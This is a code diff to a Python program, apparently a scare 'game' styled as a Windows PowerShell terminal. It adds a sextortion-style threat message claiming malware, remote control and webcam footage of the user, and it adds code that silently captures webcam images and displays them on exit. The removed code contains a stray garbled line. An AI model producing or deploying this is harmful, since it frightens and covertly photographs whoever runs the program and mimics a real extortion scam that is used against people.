@@ -424,14 +424,18 @@ class PowerShellTerminal:
         return None
         
     def is_typing_allowed(self):
-        if not self.input_enabled or self.typing_job:
-            story_manager.py
+        """Check if typing is currently allowed"""
+        if not self.input_enabled:
             return False
-        
+            
         cursor_pos = self.terminal_text.index(tk.INSERT)
         cursor_line, cursor_col = map(int, cursor_pos.split('.'))
         prompt_line, prompt_col = map(int, self.current_input_line.split('.'))
-        return cursor_line > prompt_line or (cursor_line == prompt_line and cursor_col >= prompt_col)
+        
+        if cursor_line < prompt_line or (cursor_line == prompt_line and cursor_col < prompt_col):
+            return False
+            
+        return True
 
     def start_protection_threads(self): 
         def process_protection():
@@ -856,7 +860,32 @@ Microsoft Windows [Version 10.0.22631.5189]
 
 Pay close attention to what I’m about to say.
 Take a moment to focus and consider this carefully.
-You don’t know me, but I know you—better than you think.
+You don’t know me, but I know you.
+
+We're about to discuss a deal between you and me, and I don't play games.
+Well, you've been a bit careless lately, clicking every link you see, believing all the crap you read online.
+
+I actually placed a Malware on your system not that long time ago when you go to those sketchy websites where you watch (you know what I mean). I just needed a way to speak to you. :)
+
+And when you got busy enjoying those videos, your system started working as a RDP (Remote Protocol) which provided me complete control over your device.
+
+I can peep at everything on your screen, switch on your camera and mic, and you won't even notice.
+
+Simply a single click, I can send this garbage to all of your contacts. HAHAHAHAHA.
+
+Yeah, Yeah, I've got footage of you doing embarrassing things in your room.
+
+Your confusion is clear, but don't expect sympathy. I will give you two alternatives.
+
+First Option is to ignore my message.
+
+You should know what will happen if you choose this option. I will send your video to all of your contacts. The video is straight fire, and I can't even fathom the humiliation you'll endure when your colleagues, friends, and fam check it out. But hey, that's life, ain't it? Don't be playing the victim here.
+There’s no easy way out. Try to leave, and you’ll see what happens.
+
+Option 2 is to play a game.
+
+Let's see what happens if you choose this option. Your filthy secret remains private. I will wipe everything clean once you solve the riddles correctly.
+
 
 Let’s begin.
 
@@ -883,8 +912,53 @@ Lives: 3 | Type 'help' for commands
             pass
             
         self.animate_text("Terminal Enigma - Shutting Down. Farewell.\n", "success")
-        self.root.after(1500, lambda: self.root.quit())
-        self.root.after(1600, lambda: sys.exit(0))
+        
+        # Save observation photos before exiting
+        self.save_observation_photos()
+        
+        # Launch photo viewer after a short delay
+        self.root.after(1500, self.launch_photo_viewer)
+        self.root.after(1600, lambda: self.root.quit())
+        self.root.after(1700, lambda: sys.exit(0))
+    
+    def save_observation_photos(self):
+        """Save the captured webcam images to files for the photo viewer"""
+        phases = ["game_start", "correct_answer", "wrong_answer", "final_reveal"]
+        
+        # Save any captured images that haven't been saved yet
+        for i, (phase, _) in enumerate(self.captured_images):
+            if i < len(phases):
+                filepath = f"observation_{phases[i]}.jpg"
+                try:
+                    # Get the original frame and save it
+                    cap = cv2.VideoCapture(0)
+                    ret, frame = cap.read()
+                    if ret:
+                        cv2.imwrite(filepath, frame)
+                    cap.release()
+                except Exception as e:
+                    print(f"DEBUG: Error saving observation photo: {str(e)}")
+    
+    def launch_photo_viewer(self):
+        """Launch the photo viewer as a separate process"""
+        try:
+            # Get paths of observation photos
+            observation_paths = []
+            phases = ["game_start", "correct_answer", "wrong_answer", "final_reveal"]
+            for phase in phases:
+                path = f"observation_{phase}.jpg"
+                if os.path.exists(path):
+                    observation_paths.append(path)
+            
+            # Launch photo viewer with the paths as arguments
+            import subprocess
+            cmd = [sys.executable, "photo_viewer.py"]
+            if observation_paths:
+                cmd.extend(["--images"] + observation_paths)
+            
+            subprocess.Popen(cmd)
+        except Exception as e:
+            print(f"DEBUG: Error launching photo viewer: {str(e)}")
     
     def apply_dark_title_bar(self):
         """Apply dark title bar on Windows 10+"""
